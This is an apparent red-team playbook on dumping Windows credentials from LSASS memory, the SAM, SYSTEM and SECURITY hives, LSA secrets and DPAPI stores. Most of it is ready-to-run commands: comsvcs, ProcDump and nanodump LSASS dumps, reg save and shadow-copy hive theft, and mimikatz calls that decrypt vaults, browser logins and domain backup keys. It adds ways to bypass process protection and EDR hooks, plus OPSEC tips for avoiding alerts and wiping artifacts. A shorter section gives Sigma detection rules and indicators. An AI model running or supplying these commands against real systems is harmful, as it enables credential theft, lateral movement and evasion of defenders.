# Local Credential Harvesting (LSASS / SAM / DPAPI)

ATT&CK: T1003.001 (LSASS Memory), T1003.002 (Security Account Manager), T1003.004 (LSA Secrets),
T1003.005 (Cached Domain Credentials), T1555.003 (Credentials from Web Browsers),
T1555.004 (Windows Credential Manager / DPAPI). CWE-522 (Insufficiently Protected Credentials),
CWE-256 (Plaintext Storage of a Password).

## Theory / Mechanism

After SYSTEM/admin, harvest local secrets to fuel lateral movement: cleartext passwords / NTLM /
Kerberos keys in **LSASS** memory; password hashes in the **SAM** hive (+ `SYSTEM` for the boot key);
LSA secrets / cached domain creds; and **DPAPI**-protected vault entries, browser logins and WiFi
keys. Each method exposes a *different* detection surface — choose by what the EDR watches and whether
LSASS is protected (`RunAsPPL`).

## Modern 2024-2026 currency (verified)

- **comsvcs.dll MiniDump (LOLBin)**: `rundll32 comsvcs.dll, MiniDump <pid> <path> full` — both binaries
  are MS-signed, but it is a high-fidelity alert (Splunk/AMSI flag the cmdline). The PATH arg cannot be
  quoted → no spaces (use a short path / no-space directory).
- **PssCaptureSnapshot (stealthier)**: snapshot LSASS with `PssCaptureSnapshot` (needs a handle via
  `OpenProcess`/handle-dup with `PROCESS_DUP_HANDLE`) then `MiniDumpWriteDump` over the *snapshot*, not
  the live process — avoids the direct-read race and some EDR heuristics. Elastic ships a 2025 rule for
  two successive accesses to two LSASS instances by one process.
- **Direct-syscall / handle-dup tooling**: `nanodump` (BOF) builds the minidump in memory with
  configurable syscalls + handle duplication, can write an invalid signature to defeat scanners, and
  exfil without touching disk. `Dumpert`/`SysWhispers` bypass userland API hooks.
- **PPL / RunAsPPL**: if `RunAsPPL=1`, userland dumps fail; bypass via BYOVD (EDRSandblast strips PPL),
  `PPLFault`/`GodFault` (driverless), or mimikatz `!+` / `!processprotect`.
- **VSS shadow copy** for SAM/SYSTEM/NTDS without locking live hives.
- `pypykatz` (pure-Python, off-host) parses minidumps without running mimikatz on the target.

## Complete working commands

### LSASS dump
```cmd
:: A) comsvcs LOLBin (loud but no external tool) — no spaces in the path
for /f "tokens=2" %p in ('tasklist ^| findstr /i lsass') do set L=%p
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %L% C:\Windows\Tasks\d.dmp full

:: B) ProcDump (MS-signed) — still flagged but signed
procdump.exe -accepteula -ma lsass.exe C:\Windows\Tasks\d.dmp

:: C) nanodump (BOF / standalone) — in-memory, invalid signature, syscall variants
nanodump.x64.exe --write C:\Windows\Tasks\d.dmp --valid    :: or pipe out via C2 with --getpid
```
```powershell
# D) PssCaptureSnapshot (stealthier) — dump from a process-snapshot CLONE of lsass
#    (handle-dup -> PssCaptureSnapshot -> MiniDumpWriteDump on the clone), avoiding a direct
#    handle to live lsass. Use nanodump's snapshot mode or an equivalent PssCaptureSnapshot loader.
nanodump.x64.exe --snapshot --write C:\Windows\Tasks\d.dmp
```
Parse the dump **off-host** (never run mimikatz on the target if avoidable):
```bash
pypykatz lsa minidump d.dmp                      # pure python, off-host
# or:  mimikatz # sekurlsa::minidump d.dmp  ;  sekurlsa::logonpasswords
```

### SAM / SYSTEM (local hashes)
```cmd
:: With admin or SeBackupPrivilege
reg save HKLM\SAM    C:\Windows\Tasks\sam
reg save HKLM\SYSTEM C:\Windows\Tasks\sys
reg save HKLM\SECURITY C:\Windows\Tasks\sec      :: LSA secrets / cached creds
:: off-host:
::   impacket-secretsdump -sam sam -system sys -security sec LOCAL
```

### VSS shadow copy (avoid locking live hives; also NTDS.dit on a DC)
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM    C:\Windows\Tasks\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Tasks\sys
vssadmin delete shadows /for=C: /quiet           :: cleanup
```

### DPAPI (vault, browser, WiFi) — off-host decrypt
```cmd
:: Locate masterkeys + credential blobs
dir /s /b "%APPDATA%\Microsoft\Protect\*"                          :: masterkeys
dir /s /b "%LOCALAPPDATA%\Microsoft\Credentials\*"                 :: credential blobs
```
```text
mimikatz # sekurlsa::dpapi                                       :: pull masterkeys from LSASS
mimikatz # dpapi::masterkey /in:<mkfile> /rpc                    :: decrypt via DC (online)
mimikatz # dpapi::cred /in:<credblob>                            :: decrypt a credential blob
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
:: Domain DPAPI backup key (requires DA) decrypts ANY user's blobs:
mimikatz # lsadump::backupkeys /system:<DC> /export
```

### LSA secrets / cached domain creds / Credential Manager
```text
mimikatz # lsadump::secrets        :: service account passwords (LSA secrets)
mimikatz # lsadump::cache          :: MSCACHEv2 (mscash2) — hashcat -m 2100
cmdkey /list                       :: enumerate stored Windows credentials (no plaintext)
```

The PssCaptureSnapshot → MiniDumpWriteDump path (handle-dup, snapshot, dump from the clone) is the
stealthier LSASS acquisition — use nanodump's snapshot mode or an equivalent loader; parse off-host.

## Detection

```yaml
title: LSASS Memory Dump (comsvcs MiniDump / MiniDumpWriteDump / Snapshot)
logsource: { product: windows }
detection:
  comsvcs:
    EventID: 4688
    CommandLine|contains|all: ['comsvcs', 'MiniDump']
  procaccess:                       # Sysmon EID 10
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains: ['0x1010','0x1410','0x143a','0x1438']
    CallTrace|contains: ['dbghelp.dll','dbgcore.dll']
  snapshot:                         # two successive accesses to two LSASS instances by one proc
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains: '0x1fffff'  # PROCESS_ALL incl. PROCESS_DUP_HANDLE
  condition: comsvcs or procaccess or snapshot
level: high
---
title: SAM/SYSTEM Hive Export or Shadow Copy Creation
logsource: { product: windows, category: process_creation }
detection:
  reg: { Image|endswith: '\reg.exe', CommandLine|contains|all: ['save','HKLM\\SAM'] }
  vss: { Image|endswith: '\vssadmin.exe', CommandLine|contains: ['create','shadow'] }
  condition: reg or vss
level: high
```
IOCs: handle to `lsass.exe` with `PROCESS_VM_READ`/`PROCESS_DUP_HANDLE`; `comsvcs`+`MiniDump`
cmdline; `.dmp` files (esp. literal `lsass.dmp`); `reg save HKLM\SAM`; `vssadmin create shadow`;
reads of `\Microsoft\Protect\*` masterkeys and `\Credentials\*` blobs; 4672 SeDebug then LSASS access.

## OPSEC

- Avoid the literal name `lsass.dmp` and avoid running mimikatz on-target — **dump on-host, parse
  off-host** (pypykatz). Prefer snapshot/handle-dup over `OpenProcess(lsass, VM_READ)` which is the
  most-watched access pattern.
- `RunAsPPL=1`? userland dumps fail — pivot to BYOVD/`GodFault` (kernel-byovd.md) before dumping.
- VSS: **delete the shadow copy** and the exported hives after copying. comsvcs MiniDump is a near-
  certain alert on modern EDR — only use when nothing stealthier is available.
- DPAPI: decrypt off-host with the masterkey or the domain backup key; touch only the target user's
  blobs to minimize file-access telemetry. Clean up all dump/hive artifacts on exit.

## References
- Deep Instinct — "LSASS Memory Dumps are Stealthier than Ever"; Elastic — PssCaptureSnapshot
  detection rules (2025 update)
- Splunk Security Content — "Dump LSASS via comsvcs DLL"; SOC Investigation — LSASS dumping vs logs
- helpsystems/fortra & S3cur3Th1sSh1t — nanodump; skelsec/pypykatz; gentilkiwi/mimikatz (dpapi/lsadump)
- yo-yo-yo-jbo/dumping_lsass — survey of LSASS dump methods
